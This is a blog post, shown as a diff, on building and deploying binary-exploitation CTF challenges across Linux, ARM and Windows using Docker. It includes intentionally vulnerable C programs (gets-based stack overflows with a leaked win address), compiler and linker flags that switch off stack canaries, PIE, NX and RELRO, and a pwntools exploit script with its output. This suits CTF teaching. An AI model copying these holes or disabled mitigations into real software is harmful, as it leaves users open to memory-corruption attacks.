@@ -1,0 +1,399 @@
+---
+title: Writing and Deploying Pwn Challenges [Multi-arch/OS]
+date: '2024-07-26'
+tags: ['dev-notes', 'pwn', 'docker', 'deployment']
+draft: false
+summary: Creating pwn challenges for different OS/arch from scratch, and deploying it remotely using Docker.
+---
+
+## Introduction
+
+This blog post will cover all the basics on how you can develop pwn challenges [Linux, Windows and ARM[hf/64]] and how to deploy them using docker so that they'll allow remote connections.
+
+| Similar concept is applicable to Crypto, Jail or other challenges that require a netcat connection.
+
+## Table of Content
+
+- **[Challenge Development](#challenge-development)**
+- **[Linux](#linux)**
+- **[ARMHF and ARM64](#armhf-and-arm64)**
+- **[Windows](#windows)**
+- **[Linux Kernel](#linux-kernel)**
+
+## Challenge Development
+
+Let's consider the following source code:
+
+```c:main.c
+// gcc -o main main.c -no-pie -fno-stack-protector -w
+#include <stdio.h>
+
+__attribute__((constructor))
+void __constructor__(){
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+    alarm(0x10);
+}
+
+void win() {
+    const int FLAG_SZ = 0x1A;
+    char flag[FLAG_SZ];
+    FILE *fp = fopen("flag.txt", "r");
+    if(!fp) {
+        puts("Unable to read the flag!");
+        exit(1);
+    }
+    fread(flag, 1, FLAG_SZ, fp);
+    flag[FLAG_SZ] = '\0';
+    puts(flag);
+    exit(0);
+}
+
+void vuln() {
+    char buffer[0x20];
+    printf("You have to jump to: 0x%llx\n", win);
+    gets(buffer);
+}
+
+int main(int argc, char* argv) {
+    vuln();
+}
+```
+
+I won't go through where the vulnerability exists, and how we can exploit it, however, the one function called `__constructor__` is pretty important. What this will do, is set buffering, so when this binary is hosted to receive connection through a socket, it's IO will be unbuffered and will allow for `stdin`, `stdout` and `stderr` to be served over a socket. And alarm will automatically send `SIGALARM` to the binary after `n` seconds, i.e. in our case `0x10` seconds.
+
+For every pwn chal that you create, make sure to just copy paste this `__constructor__` function, or set buffering yourself.
+
+## Linux
+
+In order to compile binary for Linux systems, we need `gcc` (or `g++`; depending on the challenge). But, there are certain flags to add/remove certain mitigations which are in place.
+
+The following table contains all the information we need to know about the `gcc` flags for pwn:
+
+| Flag                 | Description                                                         |
+| -------------------- | ------------------------------------------------------------------- |
+| -fno-stack-protector | Disable Stack Canary                                                |
+| -no-pie              | Disables PIE on the final executable and also sets RELRO to partial |
+| -zexecstack          | Marks the stack as executable                                       |
+| -Wl,-z,norelro       | Sets no RELRO                                                       |
+
+> NOTE: PIE must be disabled for RELRO to be partial.
+
+Now, to deploy this challenge, we will make use of my own docker image. [TheFlash2k/pwn-chal](https://hub.docker.com/r/theflash2k/pwn-chal). I wrote this image to abstract the deployment of a pwn challenge. The [documentation](https://github.com/TheFlash2k/pwn-chal/blob/master/README.md) is pretty extensive so in order to understand the use of the variables, refer to the docs.
+
+To deploy a challenge, you need to set only one variable, `CHAL_NAME`. If you have the flag, you can also copy the flag accordingly. We'll use: `CTF{F4k3_fl4g_f0r_73s71ng}` as `flag.txt`. The final Dockerfile is as follows for this particular challenge:
+
+```Dockerfile:Dockerfile
+FROM theflash2k/pwn-chal:latest
+
+ENV CHAL_NAME=main
+COPY ${CHAL_NAME} .
+COPY flag.txt .
+```
+
+Now, what this will do is simply copy the file from our folder into `/app` inside the container and then serve the binary using `ynetd` on port `8000`.
+
+| **NOTE**: Both `ynetd` and port `8000` can be changed using their respective variables. Refer to [docs](https://github.com/TheFlash2k/pwn-chal/blob/master/README.md).
+
+Now, into run this, we must first build the image, and then run the image like this:
+
+```bash
+docker build -t my-first-pwn-chal .
+
+docker run -it --rm --name my-first-pwn-chal --hostname pwn-chal -p8000:8000 my-first-pwn-chal
+```
+
+Once you run the container, you'll see the following message in the logs:
+
+```bash:stdout
+[i] Running main in /app as ctf-player using ynetd and listening locally on 8000
+```
+
+Now, in order to interact with the binary, you can use netcat or pwntools. We'll use pwntools and the final solve script will look something like this:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process("./main")
+io.recvuntil(b":")
+leak = int(io.recvline()[:-1], 16)
+info("Jumping to: %#x" % leak)
+payload = flat(cyclic(0x28, n=8), leak)
+io.sendline(payload)
+
+io.interactive()
+```
+
+Running the script, we can see the output:
+
+```bash
+$ ./exploit.py REMOTE localhost 8000
+
+[+] Opening connection to localhost on port 8000: Done
+[*] Jumping to: 0x40126c
+[*] Switching to interactive mode
+CTF{F4k3_fl4g_f0r_73s71ng}
+[*] Got EOF while reading in interactive
+```
+
+## ARMHF and ARM64
+
+Similar to x86-64 Linux, ARMHF and ARM64 have a similar set of mitigations, however, the steps for compilation of the binary are slightly different. Instead of gcc, for armhf we'll use `arm-linux-gnueabihf-gcc` which is available in the `gcc-arm-linux-gnueabihf` and `aarch64-linux-gnu-gcc` for `arm64` which is available in the `gcc-aarch64-linux-gnu` package. In order to install both of these on ubuntu (any distro that uses `apt` as the package manager):
+
+```bash
+sudo apt install -y gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf
+```
+
+Now, on the host you're trying to run this, you'll also need to run the following commands:
+
+```bash
+# Install the qemu packages
+sudo apt-get install qemu binfmt-support qemu-user-static
+
+# This step will execute the registering scripts
+docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
+```
+
+After this, once you have compiled the binary, you can setup the container using the following Dockerfile:
+
+```Dockerfile:Dockerfile-arm
+FROM theflash2k/pwn-chal:arm64
+
+ENV CHAL_NAME=main-arm
+COPY ${CHAL_NAME} .
+COPY flag.txt .
+```
+
+Similar to previous one, to build and run:
+
+```bash
+docker build -t my-first-arm-chal . -f Dockerfile-arm
+
+docker run -it --rm --name my-first-arm-chal --hostname pwn-chal -p8000:8000 my-first-arm-chal
+```
+
+| **NOTE**: If you face an error like `ERROR: failed to solve: failed to prepare sha256:83a8575584e7f1c27963093b075aa5cffc5e00a57b8ae763eb099d39cee3a58a as so004yt4o3993aozx7r0rfndb: open /var/lib/docker/overlay2/7sz44aynq53dorxseoxcy8eak/.tmp-committed79317842: no such file or directory`, make sure to recheck whether you've ran the commands you needed to run for ARM or not.
+
+On running this container, we see the following:
+
+```bash
+[i] [QEMU] using qemu-aarch64 and libaries @ /usr/aarch64-linux-gnu
+[i] Running main-arm in /app as ctf-player using ynetd and listening locally on 8000 using qemu-aarch64
+```
+
+Once done, we'll use the same exploit and see whether everything is working fine for us or not.
+
+```bash
+$ ./exploit.py REMOTE localhost 8000
+
+[+] Opening connection to localhost on port 8000: Done
+[*] Jumping to: 0x4008dc
+[*] Switching to interactive mode
+CTF{F4k3_fl4g_f0r_73s71ng}
+[*] Got EOF while reading in interactive
+```
+
+| **NOTE**: This sample file is for ARM64, for ARMHF, it's the exact same.
+
+## Windows
+
+Windows pwn has been on my radar for almost a year now, but never had the time (or motivation) to learn it. So, I decided to learn windows pwn and came up with a few challenge ideas. Couldn't find a easy-to-deploy tech that could easily integrate with my already existing CTFd stack. So, that's how this image came into being. I just finished finalizing the image and testing against several challenges.
+
+For emulation, I'm using `wine` and `xvfb` to emulate a virtual display buffer. The internal implementation are already public and you can modify that accordingly to your needs. But, in order to compile a challenge for Windows on Linux, we'll make use of `mingw`.
+
+Compiling a binary on Visual Studio, we can find and disable the mitigations (and some other important settings) accordingly:
+
+| Name                                        | Path                                     | Details                                                           |
+| ------------------------------------------- | ---------------------------------------- | ----------------------------------------------------------------- |
+| Randomized Base Address                     | Project>Properties>Linker>Advanced       | -                                                                 |
+| Data Execution Prevention (DEP)             | Project>Properties>Linker>Advanced       | Prevent shellcode execution on the stack (NX)                     |
+| Image Has Safe Execption Handlers (SafeSEH) | Project>Properties>Linker>Advanced       | Sets up a lookup table for the binary to know which SEH are valid |
+| CET Shadow Stack Compatible                 | Project>Properties>Linker>Advanced       | -                                                                 |
+| Allow Isolation                             | Project>Properties>Linker>Manifest File  | Specifies behavior for manifest lookup                            |
+| Enable C++ Mitigations                      | Project>Properties>C/C++>Code Generation | Specify the mode of exception handling (SEH or simple EH)         |
+| Security Check                              | Project>Properties>C/C++>Code Generation | Auto-detect stack overflows                                       |
+| Control Flow Guard (CFG)                    | Project>Properties>C/C++>Code Generation | -                                                                 |
+| Spectre Mitigation                          | Project>Properties>C/C++>Code Generation | -                                                                 |
+
+Whereas, if compiling with `mingw`, you need to use `-Wl` to pass the following flags to the linker:
+
+| Flag              | Description                                                               |
+| ----------------- | ------------------------------------------------------------------------- |
+| --no-seh          | Turns off SEH for the image                                               |
+| --dynamicbase     | Enables ASLR on the binary                                                |
+| --nxcompat        | Enables NX [DEP] on the binary                                            |
+| --no-demangle     | Do not demangle the symbol names                                          |
+| --high-entropy-va | Image is compatible with 64-bit address space layout randomization (ASLR) |
+| --forceinteg      | Code integrity checks are enforced                                        |
+| --no-isolation    | Image understands isolation but do not isolate the image                  |
+
+Now, for windows we'll use the following source code:
+
+```c:main.c
+#include <stdio.h>
+#include <windows.h>
+
+void win() {
+    const DWORD FLAG_SZ = 0x1A;
+    DWORD dwArg;
+    char flag[FLAG_SZ];
+    HANDLE _stdin = GetStdHandle(STD_INPUT_HANDLE);
+    HANDLE _stdout = GetStdHandle(STD_OUTPUT_HANDLE);
+
+    fflush(stdout);
+    HANDLE file = CreateFileA("C:\\flag.txt", GENERIC_READ, 0,
+        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    ReadFile(file, flag, FLAG_SZ, &dwArg, NULL);
+    WriteFile(_stdout, flag, FLAG_SZ, &dwArg, NULL);
+}
+
+void vuln() {
+    char buffer[0x20];
+    printf("You have to jump to: 0x%llx\n", win);
+    gets(buffer);
+}
+
+int main(char argc, char** argv) {
+
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+
+    vuln();
+}
+```
+
+The `main.c` and enable `Dynamic base` and disable `SEH`. We'll compile this using `mingw`. The final command for compilation is as follows:
+
+```bash
+x86_64-w64-mingw32-gcc -o main.exe main.c -w -Wl,--dynamicbase -Wl,--no-seh
+```
+
+This is because we need to set the buffering for Windows based binaries as well and since `__constructor__` won't be automatically called in the windows based binaries, we'll just manually add them in the `main` function. There are ways to automatically execute a function when binary is loaded, but those are too complex and not in the scope of this blog.
+
+After compling the binary, we'll run `winchecksec` on this binary:
+
+```bash
+Warn: No load config in the PE
+Results for: main.exe
+Dynamic Base    : "Present"
+ASLR            : "Present"
+High Entropy VA : "NotPresent"
+Force Integrity : "NotPresent"
+Isolation       : "Present"
+NX              : "NotPresent"
+SEH             : "NotPresent"
+CFG             : "NotPresent"
+RFG             : "NotPresent"
+SafeSEH         : "NotApplicable"
+GS              : "NotPresent"
+Authenticode    : "NotPresent"
+.NET            : "NotPresent"
+```
+
+Now, for the Dockerfile, it will be as follows:
+
+```Dockerfile:Dockerfile-win
+FROM theflash2k/pwn-chal:windows
+
+ENV CHAL_NAME=main.exe
+COPY ${CHAL_NAME} .
+COPY flag.txt .
+```
+
+Once again, for building and running:
+
+```bash
+docker build -t my-first-windows-chal . -f Dockerfile-win
+
+docker run -it --rm --name my-first-windows-chal --hostname pwn-chal -p8000:8000 my-first-windows-chal
+```
+
+| **NOTE**: When running the container for the first time, it will take around 10-15 seconds to setup all the wine related prefixes and registries. Once that's setup, everything else will be smoooth.
+
+Now, in the output, we can see some useful information:
+
+```bash
+[i] [WINDOWS] Setting up wine prefixes and registries...
+[i] [WINDOWS] Setting WINEPREFIX=/home/ctf-player/.wine
+[i] [WINDOWS] Output debugging is disabled
+[i] [WINDOWS] Running main.exe as ctf-player using socat and listening locally on 8000
+```
+
+Now, if output debugging is enabled (it can be enabled using `WIN_DEBUG=1` environment variable), we'll see more output when you try to access an invalid memory or write some wonky shellcode.
+
+After running our previous exploit, we'll get the flag:
+
+```bash
+./exploit.py REMOTE localhost 8000
+[+] Opening connection to localhost on port 8000: Done
+[*] Jumping to: 0x401560
+[*] Switching to interactive mode
+CTF{F4k3_fl4g_f0r_73s71ng}
+```
+
+## Linux Kernel
+
+For Linux kernel based challenges' deployment and development, you can refer to [Papadoxie](https://papadoxie.github.io/Blog/Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/)'s guide. He has explained it in great detail.
+
+## Sidenote
+
+For automation purposes I have made the following Makefile that has tons of these commands and you can just a make's target to perform a certain task. The Makefile is as following:
+
+```makefile:Makefile
+# Author: @TheFlash2k
+
+CHAL_NAME := test
+SRC := $(CHAL_NAME).c
+TAR_FILE := $(CHAL_NAME).tar
+CONTAINER_NAME := ctf-$(CHAL_NAME)
+DEFAULT_FLAG := "CTF{F4k3_fl4g_f0r_t3st1ng}"
+
+# FLAGS
+CC := gcc
+FLAGS := -w -std=c++11
+
+all:
+    $(CC) -o $(CHAL_NAME) $(SRC) $(FLAGS)
+
+dist:
+    mkdir -p ../dist/
+    mv flag.txt og_flag.txt
+    echo $(DEFAULT_FLAG) > flag.txt
+    # you can change these files to your likings
+    tar -zcvf $(TAR_FILE) $(SRC) $(CHAL_NAME) Dockerfile flag.txt
+    mv og_flag.txt flag.txt
+    # rm -f ../dist/$(TAR_FILE)
+    # mv $(TAR_FILE) ../dist/
+
+generate:
+    # This will generate a dockerfile for your challenge accordingly:
+    rm -f Dockerfile
+    echo "FROM theflash2k/pwn-chal:latest" > Dockerfile
+    echo -e "\nENV CHAL_NAME=$(CHAL_NAME)" >> Dockerfile
+    echo -e '\nCOPY $${CHAL_NAME} .' >> Dockerfile
+    echo -e "COPY flag.txt ." >> Dockerfile
+
+build:
+    docker build -t $(CONTAINER_NAME) .
+
+run:
+    docker run -it --rm -p1337:8000 --hostname $(CHAL_NAME) --name $(CONTAINER_NAME) $(CONTAINER_NAME)
+
+stop:
+    docker stop $(CONTAINER_NAME)
+
+writeup:
+    mkdir -p ../writeup/
+    mv -f libc.so.6 exploit.py ../writeup/
+    cp $(CHAL_NAME) ../writeup/
+    echo "# $(CHAL_NAME)" > ../writeup/WRITEUP.md
+clean:
+    rm -f $(CHAL_NAME)
+    docker rmi $(CONTAINER_NAME)
+```
+
+This is my personal Makefile that I use for challenges' deployment.
